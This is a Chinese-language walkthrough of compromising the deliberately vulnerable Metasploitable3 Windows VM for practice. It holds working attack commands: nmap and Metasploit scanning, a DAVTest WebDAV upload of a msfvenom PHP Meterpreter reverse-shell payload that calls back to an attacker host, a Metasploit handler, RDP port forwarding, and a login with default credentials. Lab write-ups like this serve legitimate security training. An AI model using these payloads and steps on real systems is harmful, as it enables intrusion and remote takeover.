
> Metasploitable3 是一个由 **Rapid7**（Metasploit 框架的开发者）创建和维护的、**故意设计成存在大量安全漏洞的虚拟机 (VM)**。作为 **Windows 提权专用练习靶机**的著名代表，Metasploitable3 堪称 Windows 提权的 **“DC-1”**。
> 以下是该靶机的攻击流程。[^1]

启动靶机：
```Powershell
cd .\metasploitable3-workspace
vagrant up
```
靶机 IP：`192.168.1.118`

### 1. 信息搜集
---
nmap 全面扫描：
```bash
nmap -p- -sS -sV -n -v --open --reason -oX scan_result.xml 192.168.1.118
```
其中
```
-p-        扫描全部端口
-sS        执行半开放扫描 Tcp SYN Scan
-sV        显示主机/端口上运行软件的版本
-n         不用 DNS 解析 (No DNS resolution)
-v         显示扫描日志 (Verbose mode)
--open     仅显示开放端口
--reason   显示端口处于特定状态 (开放、关闭、过滤) 的原因
-oX [xml]  导出扫描结果为 XML 格式
```
![mst3-nmap_1](img/Metasploitable3/mst3-nmap_1.png)
![mst3-nmap_2](img/Metasploitable3/mst3-nmap_2.png)
利用 msfconsole 来存储扫描结果时，必须要先启动 PostgreSQL 服务：
```bash
# 开机启动 PostgreSQL
sudo systemctl enable postgresql
# 手动启动 PostgreSQL
sudo systemctl start postgresql
sudo msfdb init
```
![mst3-postgresql](img/Metasploitable3/mst3-postgresql.png)
进入 msfconsole：
```bash
msfconsole
```
检查数据库连接情况：
```Metasploit
db_status
```
可以直接用 nmap 扫描：
```Metasploit
db_nmap -p- -sS -sV -sC -n -v 192.168.1.118
```
（`-sC` 表示默认脚本扫描）
也可以导入 XML：
```Metasploit
workspace -a win08-r2
db_import scan_result.xml
services
```
![mst3-msf_import](img/Metasploitable3/mst3-msf_import.png)

### 2. 端口服务验证
---
靶机
![mst3-windows](img/Metasploitable3/mst3-windows.png)
80 端口
![mst3-80](img/Metasploitable3/mst3-80.png)
4848 端口
![mst3-4848](img/Metasploitable3/mst3-4848.png)
8484 端口
![mst3-8484](img/Metasploitable3/mst3-8484.png)
8585 端口
![mst3-8585](img/Metasploitable3/mst3-8585.png)
9200 端口
![mst3-9200](img/Metasploitable3/mst3-9200.png)

### 3. 漏洞分析和剥削
---
重点是 8585 端口下的 **WebDAV 上传文件**服务：
![mst3-upload_pre](img/Metasploitable3/mst3-upload_pre.png)
> **WebDAV** 是一种基于 HTTP 的扩展协议，用于允许用户在远程 Web 服务器上管理文件和进行协作。由于其广泛部署（例如在 Microsoft IIS、Apache `mod_dav` 和各种云存储解决方案中），如果配置不当或存在软件缺陷，就可能成为安全漏洞的来源。
> 如果 WebDAV 服务器配置不当，**允许使用 `PUT` 或 `MOVE` 等方法上传文件**，攻击者可能上传并执行恶意脚本（如 WebShell）。

针对这一漏洞的开源工具 **DAVTest** 用于检查 WebDAV 服务器是否允许攻击者进行潜在的恶意操作（特别是文件上传和执行）：
```bash
davtest -url http://192.168.1.118:8585/uploads/
```
![](mst3-davtest.png)
利用 msfvenom 生成 payload 并上传：
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.180 LPORT=7777 -f raw > payload.php
# 使用 DAVTest 生成的文件夹
davtest -url http://192.168.1.118:8585/uploads/ -uploadfile payload.php -uploadloc DavTestDir_xsNa72UrwJ67FQ/7777.php
```
![](mst3-msfvenom.png)
![](mst3-upload_post.png)
渗透开始：
```Metasploit
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 192.168.1.180
set LPORT 7777
options
run
```
点击（上图所示）`7777.php`，获得`meterpreter >`提示符。
![](mst3-meterpreter.png)
因为`getuid`权限显示`LOCAL SERVICE`，无足够权限拆除防火墙
只能端口转发，尝试进行远程桌面连接（利用**RDP**的3389端口）
```Metasploit
portfwd add -l 9696 -p 3389 -r 192.168.1.118
```
```bash
rdesktop 127.0.0.1:9696 -g 90%
```
![](mst3-login.png)
输入凭证`vagrant:vagrant`
![](mst3-login_2.png)
然后：
![](mst3-desktop_warning.png)
关掉这个窗口，我们就得到了 **Windows Server 2008 R2** 的桌面：
![](mst3-desktop_success.png)
成功拿下。[^2]

## END
---
[^1]: 参考了[这篇文章](https://zhuanlan.zhihu.com/p/53151717)，向大佬致敬！
[^2]: 再也不做 Windows 提权了……从安装到渗透过程中靶机关机重启过好几次，我还是好好打 Linux 靶机罢（撅望）